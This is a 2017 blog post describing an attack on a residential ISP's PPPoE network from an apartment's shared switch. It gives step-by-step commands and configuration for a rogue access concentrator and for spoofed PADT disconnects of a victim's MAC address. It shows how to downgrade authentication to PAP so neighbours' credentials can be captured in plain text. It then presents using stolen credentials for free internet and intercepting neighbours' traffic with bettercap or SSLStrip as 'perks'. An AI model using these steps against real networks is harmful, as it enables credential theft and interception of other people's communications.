<!DOCTYPE html>
<html lang="en">

<!-- Head tag -->
<head>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!--Description-->
    
        <meta name="description" content="Let us discuss your security">
    

    <!--Author-->
    
        <meta name="author" content="One Plus">
    

    <!--Open Graph Title-->
    
        <meta property="og:title" content="All your creds are belong to us: Hacking an ISP for fun and internet"/>
    

    <!--Open Graph Description-->
    
        <meta property="og:description" content="Let us discuss your security" />
    

    <!--Open Graph Site Name-->
    <meta property="og:site_name" content="One Plus - X"/>

    <!--Type page-->
    
        <meta property="og:type" content="article" />
    

    <!--Page Cover-->
    

    <meta name="twitter:card" content="summary" />
    

    <!-- Title -->
    
    <title>All your creds are belong to us: Hacking an ISP for fun and internet - One Plus - X</title>

    <!-- Bootstrap Core CSS -->
    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">

    <!-- Custom Fonts -->
    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->

    <!-- Gallery -->
    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />

    <!-- Custom CSS -->
    <link rel="stylesheet" href="/css/style.css">
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-81899858-1"></script>
<script type="text/javascript">  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-81899858-1', 'auto');
  ga('send', 'pageview');
		
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-81899858-1');
</script>

    <!-- Google Adsense -->
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
 <script type="text/javascript"> (adsbygoogle = window.adsbygoogle || []).push({
    google_ad_client: "ca-pub-2313105504330449",
    enable_page_level_ads: true
  });
</script>

</head>


<body>

<div class="bg-gradient"></div>
<div class="bg-pattern"></div>

<!-- Menu -->
<!--Menu Links and Overlay-->
<div class="menu-bg">
    <div class="menu-container">
        <ul>
            
            <li class="menu-item">
                <a href="/">
                    Home
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/archives">
                    Archives
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/about">
                    About
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/contact">
                    Contact
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/gallery"> Gallery </a>
            </li>
            
 
            
            <li class="menu-item">
                <a href="https://one-plus.github.io">
                    OSINTToolkit
                </a>
            </li>
            
        </ul>
    </div>
</div>

<!--Hamburger Icon-->
<nav>
    <a href="#menu"></a>
</nav>

<div class="container">

    <!-- Main Content -->
    <div class="row">
    <div class="col-sm-12">

        <!--Title and Logo-->
        <header>
    <div class="logo">
        <a href="/"><i class="logo-icon fa fa-code" aria-hidden="true"></i></a>
        
    </div>
</header>

        <section class="main">
            
<div class="post">

    <div class="post-header">
        <h1 class="title">
            <a href="/2017/01/17/ISP-Hacking/">
                All your creds are belong to us: Hacking an ISP for fun and internet
            </a>
        </h1>
        <div class="post-info">


            
                <span class="author">Author: <a href="https://twitter.com/One_PlusX" target="_blank">One Plus</a></span> <br>
            


            
                <span class="date">2017-01-17</span>
            
            <a href="#disqus_thread" class="comments">Comments</a>
            
        </div>
    </div>

    <div class="content">

        <!-- Gallery -->
        

        <!-- Post Content -->
        <h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>Generally ISPs have been very ignorant towards their security, resulting in requirement of the government to enforce policies that would be required ISPs and Telecom Operators to provide the end users a secure and a private communication network. However, due to issues with money, ISPs prefer to relax on most of the security issues or end up hiring firms with external consultants with no idea on how to secure a Telecom Infrastructure. This is the exact reason people would require to audit their own ISPs and make a note of the vulnerabilities. The specific configurational vulnerabilities that would be mentioned in this blog results in not only of an attacker to gain credentials to access internet, but he is also capable of doing crazy number of things while sitting on the same network. The network of this ISP has been the same for more than 2 years and continues to be the same.</p>
<a id="more"></a>
<h2 id="Disclaimer"><a href="#Disclaimer" class="headerlink" title="Disclaimer"></a>Disclaimer</h2><p>I, One Plus, am not responsible for any action that any person with direct or indirect knowledge from this blog, decides to take. I do not encourage malicious behavior and I am a subscribed user of the ISP who is legitimately paying for the subscription and not stealing bandwidth.</p>
<h2 id="Mentions"><a href="#Mentions" class="headerlink" title="Mentions"></a>Mentions</h2><h2 id="My-ISP’s-setup"><a href="#My-ISP’s-setup" class="headerlink" title="My ISP’s setup"></a>My ISP’s setup</h2><p>A very small diagrammatical representation of my ISP providing internet would be as follows<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">User System --- WiFi/ADSL Modem --- Switch <span class="keyword">in</span> Apartment --- Access Concentrator --- Internet</div></pre></td></tr></table></figure></p>
<p>Here, a <strong><em>user</em></strong> connects to his <strong><em>WiFi/ ADSL Modem</em></strong> which has pppoe credentials that authenticates it with the ISP. Further, the network cable coming into my flat got connected to a <strong><em>switch placed in my apartment</em></strong>. This <strong><em>switch</em></strong> facilitates multiple flats to get access to the ISP. The <strong><em>Access Concentrator</em></strong> is a device that is placed in the ISP’s end that takes care of users to get authenticated with the ISP. Once authenticated, the network is allowed to access the internet.<br>Hence, I connected my laptop in place of the ADSL WiFi Router-Modem so that I would be in the same broadcast domain of every modem connected to that switch in my apartment. <strong><em>Evil Thoughts</em></strong></p>
<h2 id="Reconnaisance"><a href="#Reconnaisance" class="headerlink" title="Reconnaisance"></a>Reconnaisance</h2><p>The scene was set in my new flat with nothing available, other than a network cable. The hack initially began with my tingling hacker-sense to attempt and fiddle with this available RJ45 port.</p>
<h4 id="1-Plug-in-the-RJ45-cable"><a href="#1-Plug-in-the-RJ45-cable" class="headerlink" title="1. Plug in the RJ45 cable"></a>1. Plug in the RJ45 cable</h4><p>Not much to stay for this. However, we were lucky that when we plugged in the ethernet chord, we received an IP address.<br></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">oneplus@root$ ifconfig eth0</div></pre></td></tr></table></figure>
<h4 id="2-Turn-on-the-wireshark"><a href="#2-Turn-on-the-wireshark" class="headerlink" title="2. Turn on the wireshark"></a>2. Turn on the wireshark</h4><p>But obvious! When you hit any unknown network, check out the super awesome network sniffer - Wireshark!<br><img src="/2017/01/17/ISP-Hacking/ISPinit.png" alt="Random Network Capture" title="Random Network Capture"></p>
<h4 id="3-Probing-around"><a href="#3-Probing-around" class="headerlink" title="3. Probing around"></a>3. Probing around</h4><p>Figuring out the network is always requires a huge time to invest. Often, significantly larger than the exploitation phase. But understanding the functionality of a black box can only be done only if we extensively probe it. Hence we begin!</p>
<h6 id="Netdiscover"><a href="#Netdiscover" class="headerlink" title="Netdiscover"></a>Netdiscover</h6><p>The ARP requests, the best way to find out your neighbouring systems along with their MAC addresses. There are two ways to run this. One is the passive mode<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">oneplus@root$ netdiscover</div></pre></td></tr></table></figure></p>
<p>The other is the more active arp of a specific range. My choice of range would be my current broadcast range.<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">oneplus@root$ netdiscover -i eth0 -r &lt;ip ranges&gt;</div></pre></td></tr></table></figure></p>
<h6 id="Responder"><a href="#Responder" class="headerlink" title="Responder"></a>Responder</h6><p>Another beautiful tool to detect vulnerable broadcast packets like LLMNR and NBNS present in the network.<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">oneplus@root$ responder -I eth0 -A</div></pre></td></tr></table></figure></p>
<h6 id="Bettercap"><a href="#Bettercap" class="headerlink" title="Bettercap"></a>Bettercap</h6><p>Just like responder, bettercap spoofs NBNS requests and is able to do man-in-the-middle attack in the LAN.<br>To run better cap in spoofing and discovery mode, just run it.<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">oneplus@root$ bettercap</div></pre></td></tr></table></figure></p>
<p>To run better cap in spoofing, discovery, sniffer, intercepting http and https requests, targetting specific IP only -<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">oneplus@root$ bettercap -X --proxy --proxy-https -T &lt;target IP&gt;</div></pre></td></tr></table></figure></p>
<h6 id="NMap"><a href="#NMap" class="headerlink" title="NMap"></a>NMap</h6><p>And ofcourse, what is reconnaisance without the hacker’s favourite network mapper? We do a simple nmap Ping Scan on the network ranges of our choice. My first scan range is going to be our current broadcast range.<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">oneplus@root$ nmap -sn -n --disable-arp-ping &lt;iprange&gt;</div></pre></td></tr></table></figure></p>
<p>At this point, it was clear I was connected to an isolated network segment without access to internet. Damn! So I go through the entire wireshark logs again.<br></p>
<p>After going through the logs over and over trying to identify vulnerable protocols, luck struck and the electricity in my apartment tripped. This resulted in all the routers to disconnect. The second the electricity returned, I was flooded with a certain type of packet - <strong><em>PADI</em></strong>.</p>
<h2 id="Authentication-Technology"><a href="#Authentication-Technology" class="headerlink" title="Authentication Technology"></a>Authentication Technology</h2><p>Upon reading through a couple of RFC(s) (<a href="https://tools.ietf.org/html/rfc2516" target="_blank" rel="external">2516</a>, <a href="https://tools.ietf.org/html/rfc4938" target="_blank" rel="external">4938</a>, <a href="https://tools.ietf.org/html/rfc5578" target="_blank" rel="external">5578</a>), I could understand the 5 critical PPPoE packets. Infact, it is not very different from the concept of 3 way handshake, except that this has session management involved in it.</p>
<p><strong><em>PADI</em></strong> (PPPoE Active Discovery Initiation) - Broadcast packet - Sent from Client to the broadcast network - According to RFC, needs to contain Source MAC and a Service Name Tag.<br>(talk about access concentrator)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">                              -&gt;(Random other system <span class="keyword">in</span> broadcast network)</div><div class="line"> ______                      /</div><div class="line">|Client|              ______/            ___________________</div><div class="line">|System| ----PADI---&gt;|Switch|----------&gt;(Access Concentrator)</div><div class="line"> ------               ------\            -------------------</div><div class="line">  /_\                        \</div><div class="line">                              -&gt;(Random other system <span class="keyword">in</span> broadcast network)</div></pre></td></tr></table></figure></p>
<p><strong><em>PADO</em></strong> (PPPoE Active Discovery Offer) - Access Concentrator to Client - Offer, along with it’s AC Name that and can do the work for the Service Name Tag of PADI.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">                             (Random other system <span class="keyword">in</span> broadcast network)</div><div class="line"> ______                      /</div><div class="line">|Client|              ______/             ___________________</div><div class="line">|System| &lt;-----------|Switch|&lt;---PADO----(Access Concentrator)</div><div class="line"> ------               ------\             -------------------</div><div class="line">  /_\                        \</div><div class="line">                             (Random other system <span class="keyword">in</span> broadcast network)</div></pre></td></tr></table></figure>
<p><strong><em>PADR</em></strong> (PPPoE Active Discovery Request) - Client to Access Contentrator - To establish session with the Access Concentrator</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">                             (Random other system <span class="keyword">in</span> broadcast network)</div><div class="line"> ______                      /</div><div class="line">|Client|              ______/             ___________________</div><div class="line">|System| ----PADR---&gt;|Switch|-----------&gt;(Access Concentrator)</div><div class="line"> ------               ------\             -------------------</div><div class="line">  /_\                        \</div><div class="line">                             (Random other system <span class="keyword">in</span> broadcast network)</div></pre></td></tr></table></figure>
<p><strong><em>PADS</em></strong> (PPPoE Active Discovery Session) - Access Concentrator to Client - Accept the PADR and start with Authentication. Authentication types can be PAP, CHAP, MS CHAP, etc.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">                             (Random other system <span class="keyword">in</span> broadcast network)</div><div class="line"> ______                      /</div><div class="line">|Client|              ______/             ___________________</div><div class="line">|System| &lt;-----------|Switch|&lt;----PADS---(Access Concentrator)</div><div class="line"> ------               ------\             -------------------</div><div class="line">  /_\                        \</div><div class="line">                             (Random other system <span class="keyword">in</span> broadcast network)</div></pre></td></tr></table></figure>
<p>Though it would make sense to mention <strong><em>PAP</em></strong> (Password Authentication Protocol) over here. At a later stage, you will understand why I did this. PAP is quite simple. The packet is called PPP LCP (Point to Point Protocol Link Control Protocol) and the process is as follows -</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Client ----Configuration Request----&gt; Server</div><div class="line">Client &lt;---Configuration Ack--------- Server</div><div class="line">Client &lt;---Echo Request-------------- Server</div><div class="line">Client ----Echo Reply---------------&gt; Server</div><div class="line">Client ----Authentication Request---&gt; Server (This stage contains credentials)</div><div class="line">Client &lt;---Authentication Ack/ Nak--- Server</div><div class="line">Client &lt;---Termination Request------- Server</div><div class="line">Client ----Termination Ack----------&gt; Server</div></pre></td></tr></table></figure>
<p><strong><em>PADT</em></strong> (PPPoE Active Discovery Terminate) - Client to Access Concentrator - The giant logout button :D</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">                             (Random other system <span class="keyword">in</span> broadcast network)</div><div class="line"> ______                      /</div><div class="line">|Client|              ______/             ___________________</div><div class="line">|System| ---PADT----&gt;|Switch|-----------&gt;(Access Concentrator)</div><div class="line"> ------               ------\             -------------------</div><div class="line">  /_\                        \</div><div class="line">                             (Random other system <span class="keyword">in</span> broadcast network)</div></pre></td></tr></table></figure>
<p>Here is a screenshot of the capture of PPPoE-PAP authentication process.</p>
<img src="/2017/01/17/ISP-Hacking/PPPoEPAP.png" alt="PPPoE PAP Network Capture" title="PPPoE PAP Network Capture">
<h2 id="Technical-setup"><a href="#Technical-setup" class="headerlink" title="Technical setup"></a>Technical setup</h2><p>A very quick run through on what we need<br>Prior to going into the Hacking, would recommend everyone to prepare with the setup. For this hack, we are going to need the following</p>
<ul><br>Ubuntu installed on Virtual Box with PPPoE server<br>PPPoE Driver<br>Confifguring PPPoE/ ADSL Connections - PPPoEConf<br>To send PADT requests - pppoesk<br></ul>

<h4 id="1-Ubuntu-on-Virtual-Box-with-PPPoE-Server"><a href="#1-Ubuntu-on-Virtual-Box-with-PPPoE-Server" class="headerlink" title="1. Ubuntu on Virtual Box with PPPoE Server"></a>1. Ubuntu on Virtual Box with PPPoE Server</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">oneplus@root$ apt-get install ppp</div><div class="line">oneplus@root$ wget http://www.roaringpenguin.com/files/download/rp-pppoe-3.10.tar.gz</div><div class="line">oneplus@root$ tar -zxf rp-pppoe-3.10.tar.gz</div><div class="line">oneplus@root$ <span class="built_in">cd</span> rp-pppoe-3.10/src</div><div class="line">oneplus@root$ ./configure</div><div class="line">oneplus@root$ make</div><div class="line">oneplus@root$ make install</div></pre></td></tr></table></figure>
<p>Configurational changes are required to be made in this server<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">$ cp /etc/ppp/options  /etc/ppp/pppoe-server-options</div><div class="line">oneplus@root$ vi /etc/ppp/pppoe-server-options</div><div class="line">----------------------------------------------------------------------------------------</div><div class="line">ms-dns 8.8.8.8</div><div class="line">ms-dns 8.8.4.4</div><div class="line">asyncmap 0</div><div class="line">noauth</div><div class="line">crtscts</div><div class="line">lock</div><div class="line">hide-password</div><div class="line">modem</div><div class="line">debug</div><div class="line">proxyarp</div><div class="line">lcp-echo-interval 10</div><div class="line">lcp-echo-failure 2</div><div class="line">noipx</div><div class="line">plugin /etc/ppp/plugins/rp-pppoe.so</div><div class="line">require-pap</div><div class="line">ktune</div><div class="line">nobsdcomp</div><div class="line">noccp</div><div class="line">novj</div><div class="line">----------------------------------------------------------------------------------------</div></pre></td></tr></table></figure></p>
<p>To route traffice from one interface to another, you can do as follows. This is something that you a hacker might do when he would want to route all the traffice from his system to a different interface giving connection to the internet. I do not recommend anyone from attempting this. Here, you authenticate yourself from the eth0 port and have the pppoe server listening on eth1 port. All traffic recieved on eth1 can be redirected to eth0. However, I utilize the pap-secrets as a database to store all the credentials I harvested. That way, I replicate the ISP’s behaviour completely and do not give unauthenticated internet access. I can also target specific users/ flats in my apartment by allowing on those IDs to connect to the internet and intercepting their traffic.<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">oneplus@root$ vi /etc/network/interfaces</div><div class="line">----------------------------------------------------------------------------------------</div><div class="line">auto lo</div><div class="line">iface lo inet loopback</div><div class="line"> </div><div class="line">iface eth0 inet static      <span class="comment">#This can be dynamic as well (since we are authenticating using a valid PPPoE Credential)</span></div><div class="line">address www.xxx.yyy.zzz     <span class="comment">#public IP address</span></div><div class="line">netmask 255.255.255.0 <span class="comment">#Your subnet mask</span></div><div class="line">gateway www.xxx.xxx.xxx    <span class="comment">#gateway</span></div><div class="line"> </div><div class="line">iface eth1 inet static</div><div class="line">address 192.168.1.254</div><div class="line">netmask 255.255.255.0</div><div class="line">----------------------------------------------------------------------------------------</div><div class="line"></div><div class="line">oneplus@root$ <span class="built_in">echo</span> <span class="string">"nameserver 8.8.8.8"</span> &gt; /etc/resolv.conf</div><div class="line">oneplus@root$ <span class="built_in">echo</span> <span class="string">"nameserver 8.8.4.4"</span> &gt;&gt; /etc/resolv.conf</div><div class="line"></div><div class="line">oneplus@root$ vi /etc/ppp/pap-secrets</div><div class="line">----------------------------------------------------------------------------------------</div><div class="line"><span class="comment"># Secrets for authentication using PAP</span></div><div class="line"><span class="comment"># client server secret IP addresses</span></div><div class="line"> </div><div class="line"><span class="comment">#USERNAME           SERVER              PASSWORD                     CLIENT IP ADDRESS</span></div><div class="line"><span class="string">"hacked user"</span>         *           <span class="string">"harvested password"</span>                  192.168.1.1</div><div class="line">----------------------------------------------------------------------------------------</div><div class="line"></div><div class="line">oneplus@root$ <span class="built_in">echo</span> <span class="string">"192.168.1.1-20"</span> &gt; /etc/ppp/allip</div><div class="line">oneplus@root$ pppoe-server -C isp -L 192.168.1.254 -p /etc/ppp/allip -I eth1</div><div class="line">oneplus@root$ <span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward</div><div class="line">oneplus@root$ iptables -t nat -A POSTROUTING <span class="_">-s</span> 192.168.1.0/24 -o eth0 -j MASQUERADE</div></pre></td></tr></table></figure></p>
<h4 id="2-PPPoE-Driver"><a href="#2-PPPoE-Driver" class="headerlink" title="2. PPPoE Driver"></a>2. PPPoE Driver</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">oneplus@root$ apt-get install pppoe</div></pre></td></tr></table></figure>
<h4 id="3-Configuring-PPPoE-ADSL-Connection-PPPoEConf"><a href="#3-Configuring-PPPoE-ADSL-Connection-PPPoEConf" class="headerlink" title="3. Configuring PPPoE/ ADSL Connection - PPPoEConf"></a>3. Configuring PPPoE/ ADSL Connection - PPPoEConf</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">oneplus@root$ apt-get install pppoeconf</div></pre></td></tr></table></figure>
<h4 id="4-To-send-PADT-requests-pppoesk"><a href="#4-To-send-PADT-requests-pppoesk" class="headerlink" title="4. To send PADT requests - pppoesk"></a>4. To send PADT requests - pppoesk</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">oneplus@root$ apt-get install dh-autoreconf</div><div class="line">oneplus@root$ git <span class="built_in">clone</span> https://github.com/lpefferkorn/pppoesk.git /opt/pppoesk/</div><div class="line">oneplus@root$ <span class="built_in">cd</span> /opt/pppoesk/</div><div class="line">oneplus@root$ sh autogen.sh</div><div class="line">oneplus@root$ apt-get install libpcap-dev</div><div class="line">oneplus@root$ apt-get install libnet-dev</div><div class="line">oneplus@root$ ./configure</div><div class="line">oneplus@root$ make &amp;&amp; make install</div></pre></td></tr></table></figure>
<h2 id="Technical-pew-pew-pew"><a href="#Technical-pew-pew-pew" class="headerlink" title="Technical pew-pew-pew"></a>Technical pew-pew-pew</h2><h4 id="Stage-1-PADI"><a href="#Stage-1-PADI" class="headerlink" title="Stage 1 - PADI"></a>Stage 1 - PADI</h4><p>The wonderful part is, this is a broadcast request - PADI. Anyone in the network can broadcast connection request to me. Awesome!</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">                              -&gt;(Random other system <span class="keyword">in</span> broadcast network)</div><div class="line"> ______                      /</div><div class="line">|Client|              ______/            ___________________</div><div class="line">|System| ----PADI---&gt;|Switch|----------&gt;(Access Concentrator)</div><div class="line"> ------               ------\            -------------------</div><div class="line">  /_\                        \</div><div class="line">                              -&gt;(Random other system <span class="keyword">in</span> broadcast network)</div></pre></td></tr></table></figure>
<p>Now since I am the immidiate next hop of this system (and I am way closer to the apartment switch as compared the access concentrator), I am confident of the fact that my response to the client system would be way faster than that of the valid AC’s response.<br>However, to receive this PADI request, there must be new connection attempts being made. Electricity! I turned off the mains of my apartments for a couple of seconds, and as soon as I had them back on, I could see approximately 6 PADI requests.</p>
<h4 id="Stage-2-Hosting-a-fake-Access-Concentrator"><a href="#Stage-2-Hosting-a-fake-Access-Concentrator" class="headerlink" title="Stage 2 - Hosting a fake Access Concentrator"></a>Stage 2 - Hosting a fake Access Concentrator</h4><p>To mimic the behaviour of the Access Concentrator, we launch the pppd that we had setup in our Virtual Machine and capture all network traffic coming to it.<br>A step by step guide to setting up your own PPPoE server and configuring it is available at <a href="https://sskaje.me/2014/05/set-pppoe-server-ubuntu/" target="_blank" rel="external">this site</a>, else you could follow the setup guide.</p>
<p>For capturing the password, we don’t really need any other setup/ customization for capturing the passwords of the users attempting to connect. However, we do need the users to attempt to connect. But for this to happen, I needed to take risk of going and getting caught while playing around with the mains. Hence now I used the trick of the <strong><em>Giant Logout Button</em></strong> - The <strong><em>PADT</em></strong> request.</p>
<h4 id="Stage-3-Disconnecting-users-with-PADT"><a href="#Stage-3-Disconnecting-users-with-PADT" class="headerlink" title="Stage 3 - Disconnecting users with PADT"></a>Stage 3 - Disconnecting users with PADT</h4><p>Here I assume you already have got pppoesk installed following the setup guide above. As an alternate to pppoesk, we could also use <a href="https://github.com/sharpmaster/pppoe-killer.git" target="_blank" rel="external">pppoe-killer</a>.<br>Ok, so we have the PADI requests in which we have the MAC address of all our neighbours. We now keep pppoesk running and connect to the port.<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">oneplus@root$ pppoesk -i eth0 <span class="_">-s</span> &lt;VICTIM MAC ADDRESS&gt;</div><div class="line">Faking src MAC addr...</div><div class="line">Using ethernet interface : eth0</div><div class="line">Waiting <span class="keyword">for</span> packet...</div></pre></td></tr></table></figure></p>
<p>As soon as we get a PADI request from the Access Concentrator, we send it a PADT with a spoofed MAC and deauthenticate the original router. Once this happens, we make alive our honey-trap pppoe server and wait for the victim’s router to auto-reconnect. The second the router attempts to reconnect, it connects to the honeytrap server and loses it’s credentials.<br><strong><em>FUN FACT:</em></strong> Most ISPs don’t enforce CHAP/ MSCHAP authentication, hence routers are configured to use any type of authentication. This means, even if the ISP is capable of using it, we can downgrade the authentication mechanism to PAP and get the credentials in plain text. Below is the capture of my own, valid ISP credentials. :)</p>
<img src="/2017/01/17/ISP-Hacking/ISP.png" alt="Sample ISP capture" title="Sample ISP capture">
<h1 id="Perks-of-the-Hack"><a href="#Perks-of-the-Hack" class="headerlink" title="Perks of the Hack"></a>Perks of the Hack</h1><p>If you are one of those who jumped to the bottom of this blog because of “tl;dr” feeling, here is why you should read the entire blog.</p>
<h2 id="1-Free-Internet"><a href="#1-Free-Internet" class="headerlink" title="1. Free Internet"></a>1. Free Internet</h2><p>Of course, by the end of capturing one credential, we could use this credential, configure it on our pppoeconf and send it to the Access Concentrator for <strong><em>PROFIT</em></strong>! But would a malicious user actually stop here?</p>
<h2 id="2-Big-Brother-is-your-neighbour"><a href="#2-Big-Brother-is-your-neighbour" class="headerlink" title="2. Big Brother is your neighbour"></a>2. Big Brother is your neighbour</h2><p>A malicious user would anyday prefer going one step ahead and poison the entire traffic in the network.<br>This <a href="https://sskaje.me/2014/05/set-pppoe-server-ubuntu/" target="_blank" rel="external">blog post</a> beautifully explains on how to setup a real PPPoE server.<br>So here is what you can do,<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Capture PPPoE credentials from network.</div><div class="line">Store them as valid records <span class="keyword">in</span> my PPPoE server.</div><div class="line">Use a USB to Ethernet adapter (costs between 30-50 USD) and dual home my machine. (This interface becomes eth1)</div><div class="line">Redirect traffic received at ppp0 to eth1 after authentication.</div><div class="line">Use SSLStrip or bettercap <span class="keyword">for</span> fun and profit &lt;3</div></pre></td></tr></table></figure></p>
<p>Personally I utilize bettercap and have much fun and such pwn with it to perform man-in-the-middle attacks.</p>

    </div>

    

    
        <div class="post-tags">
            <i class="fa fa-tags" aria-hidden="true"></i>
            <a href="/tags/Internet-Security-Provider/">#Internet Security Provider</a> <a href="/tags/ISP/">#ISP</a> <a href="/tags/PPPoE-PAP/">#PPPoE PAP</a> <a href="/tags/Man-in-the-middle/">#Man in the middle</a> <a href="/tags/ISP-Hacking/">#ISP Hacking</a>
        </div>
    

    <!-- Comments -->
    
    <div class="comments">
        
<div id="disqus_thread">
    <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
</div>



    </div>
    

</div>

        </section>

    </div>
</div>

</div>

<!-- Footer -->
<div class="push"></div>

<footer class="footer-content">
    <div class="container">
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
                <h2>About</h2>
                <p>
                    Tanoy "NoTTY" Bose is a Security Consultant at a Big 4 (That is in the top 25 of Cybersecurity ventures). He performs a wide range of security assessments but generally prefers red teaming. As a gamer, Tanoy loves to play DotA2 and Counter Strike 1.6. While free, Tanoy is involved in doing interesting life hacks or play any CTF that is running.
                </p>
            </div>
            
    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
        <h2>Recent Posts</h2>
        <ul>
            
            <li>
                <a class="footer-post" href="/2017/01/17/ISP-Hacking/">All your creds are belong</a>
            </li>
            
            <li>
